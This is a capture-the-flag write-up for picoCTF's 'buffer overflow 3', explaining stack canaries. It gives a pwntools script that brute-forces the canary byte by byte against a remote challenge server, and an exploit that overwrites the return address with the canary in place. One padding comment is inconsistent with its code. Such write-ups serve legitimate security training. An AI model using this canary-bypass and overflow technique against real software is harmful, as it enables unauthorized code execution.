# BUFFER OVERFLOW 3

> This challenge isn't currently available at picoCTF. So I just describe how I had done this challenge.

- This challenge is next level of `buffer overflow 2`, we will know the way bypass the canary protector

> Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.

- The details of  canary is discussed in [here](https://ctf101.org/binary-exploitation/stack-canaries/)

- Program read the canary from server, and put it in a variable on stack, but the program has buffer overflow vuln, so we can brute the canary from server by brute byte by byte.

- This script will do that stuff.

```python
#! /usr/bin/python2
# filename: brute.py

from pwn import *

offset = 64
payload = b"a"*64
brute = b""

for i in range(1, 5):
    for char in string.printable:
        p = remote("saturn.picoctf.net", 55134)
        brute += char.encode()
        p.sendlineafter(b"> ", str(64+i).encode())
        p.sendlineafter(b"> ", payload+brute)
        output = p.recvall()
        if (b"?" in output):
            break
        else:
            brute = brute[:-1]
print(brute)
```

- When we knew the canary, the challenge become basic buffer overflow.

```python
#! /usr/bin/python2
# filename: exp.py

from pwn import *

p = remote("saturn.picoctf.net", 58930)


offset = b"88"

canary = b"BiRd"   # 4 bytes

padding = b"a"*64  # 64 bytes

padding_after_canary = b"a"*16  #12 bytes

ret = b"\x36\x93\x04\x08"  # 4 bytes

payload = padding + canary + padding_after_canary + ret

p.sendlineafter(b"> ", offset)
p.sendlineafter(b"> ", payload)
output = p.recvall()

print(output)
```